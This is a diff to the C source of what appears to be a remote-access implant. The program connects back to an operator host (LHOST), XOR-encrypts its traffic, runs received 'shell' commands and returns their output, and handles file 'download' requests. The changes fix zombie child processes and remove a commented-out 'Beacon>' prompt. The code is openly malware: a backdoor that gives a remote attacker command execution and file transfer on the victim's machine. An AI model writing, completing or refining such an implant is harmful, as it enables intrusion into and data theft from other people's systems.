@@ -4,6 +4,7 @@
 #include <string.h>
 #include <stdlib.h>
 #include <sys/wait.h>
+#include <signal.h>
 #include "helpers.c"
 #include "payload_common.h"
 
@@ -32,6 +33,10 @@ int sendfile(FILE* fp, int fd, char* key)
 
 int main(void)
 {
+
+
+	signal(SIGCHLD, SIG_IGN);
+
 	int connection_established;
 	char* ip = LHOST;
 	char* key = KEY;
@@ -68,8 +73,8 @@ int main(void)
 			else if(str_starts_with(xorbuf, "shell") == 0)
 			{
 
-				int status = 0;
-				pid_t wpid, child_pid;
+				int status;
+				pid_t child_pid;
 				FILE* fp;
 				
 				
@@ -95,8 +100,10 @@ int main(void)
 					write(sock, xordata, strlen(command));
 					free(xordata);
 					
-					exit(EXIT_SUCCESS);
+					return 0;
 				}
+
+				waitpid(child_pid, &status, WNOHANG);
 
 			}
 			else if(str_starts_with(xorbuf, "download") == 0){
@@ -154,13 +161,6 @@ int main(void)
 			
 			memset(buf, '\0', strlen(buf));
 			free(xorbuf);
-		/*	
-			char* prompt = "Beacon>\n";
-			char* xorprompt = XOR(prompt, key, strlen(prompt), keylen);
-			write(sock, xorprompt, strlen(prompt));
-			free(xorprompt);
-		*/
-
 		}
 	}
 
